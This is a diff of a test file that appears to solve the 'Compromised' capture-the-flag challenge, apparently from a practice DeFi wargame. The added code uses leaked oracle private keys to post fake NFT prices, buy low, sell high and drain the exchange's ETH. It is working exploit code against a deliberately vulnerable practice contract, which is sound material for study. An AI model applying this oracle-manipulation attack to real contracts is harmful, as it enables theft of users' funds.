@@ -85,22 +85,78 @@ describe('Compromised challenge', function () {
         )
         
         // lasty we get the addresses
-        let addresses = publicKeys.map(
-            element => publicKeyToAddress(element).toString('hex')
-        )
-        console.log(addresses);
+        for (let i = 0; i < publicKeys.length; i++) {
+            let address = publicKeyToAddress(publicKeys[i]).toString('hex')
+            console.log('Hacked address', i, ":", address);
+        }
         
+        // set up hacked sources from private keys
+        let sourcesHacked = privateKeys.map(element => new ethers.Wallet(element, ethers.provider));
+        const NEW_NFT_PRICE = ethers.utils.parseEther("0.001");
+        const NFT_SYMBOL = "DVNFT";
+        
+        let oldPrice = await this.oracle.getMedianPrice(NFT_SYMBOL);
+        console.log("Old price:", parseInt(oldPrice._hex, 16) / 10**18);
+        let oldBalance = await this.nftToken.balanceOf(attacker.address);
+        console.log("Old balance:", parseInt(oldBalance._hex, 16) / 10**18);
 
-        // AttackContract = await ethers.getContractFactory('AttackCompromised', attacker);
-        // attackContract = await AttackContract.deploy(
-        //     this.pool.address,
-        // );
-        // await attackContract.executeFlashloan(TOKENS_IN_POOL);
+        // set up new low price for NFT's
+        for (let i = 0; i < sourcesHacked.length; i++) {
+            let oracleHacked = await this.oracle.connect(sourcesHacked[i]);
+            await oracleHacked.postPrice(NFT_SYMBOL, NEW_NFT_PRICE);
+        }
 
-        // await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // wait 2 days
+        let newPrice = await this.oracle.getMedianPrice(NFT_SYMBOL);
+        console.log("New Price:", parseInt(newPrice._hex, 16) / 10**18);
 
-        // await attackContract.executeDrain();
+        // Buy NFT's for low price
+        let exchange = this.exchange.connect(attacker);
+        for (let i = 0; i < 11; i++) {
+            await exchange.buyOne({ value: NEW_NFT_PRICE });
+        }
+        let newBalance = await this.nftToken.balanceOf(attacker.address);
+        console.log("New balance:", parseInt(newBalance._hex, 16));
 
+        // Set up old price
+        for (let i = 0; i < sourcesHacked.length; i++) {
+            let oracleHacked = await this.oracle.connect(sourcesHacked[i]);
+            await oracleHacked.postPrice(NFT_SYMBOL, INITIAL_NFT_PRICE);
+        }
+
+        let currPrice = await this.oracle.getMedianPrice(NFT_SYMBOL);
+        console.log("Current Price:", parseInt(currPrice._hex, 16) / 10**18);
+
+        // Approve exchange
+        let nft = this.nftToken.connect(attacker);
+        for (let i = 0; i < 11; i++) {
+            await nft.approve(exchange.address, i);
+        }
+        
+        // Sell NFT's for low price
+        for (let i = 0; i < 10; i++) {
+            await exchange.sellOne(i);
+        }
+        let currBalance = await this.nftToken.balanceOf(attacker.address);
+        console.log("Current balance:", parseInt(currBalance._hex, 16));
+        
+        // Take whats left in exchange
+        let exbal = await ethers.provider.getBalance(exchange.address)
+        console.log("ETH left in exchange:", parseInt(exbal._hex, 16) / 10**18);
+        for (let i = 0; i < sourcesHacked.length; i++) {
+            let oracleHacked = await this.oracle.connect(sourcesHacked[i]);
+            await oracleHacked.postPrice(NFT_SYMBOL, exbal);
+        }
+        await exchange.sellOne(10);
+        exbal = await ethers.provider.getBalance(exchange.address)
+        console.log("ETH left in exchange:", parseInt(exbal._hex, 16) / 10**18);
+        let bal = await ethers.provider.getBalance(attacker.address)
+        console.log("ETH of attacker:", parseInt(bal._hex, 16) / 10**18);
+
+        // Return to normal
+        for (let i = 0; i < sourcesHacked.length; i++) {
+            let oracleHacked = await this.oracle.connect(sourcesHacked[i]);
+            await oracleHacked.postPrice(NFT_SYMBOL, INITIAL_NFT_PRICE);
+        }
     });
 
     after(async function () {
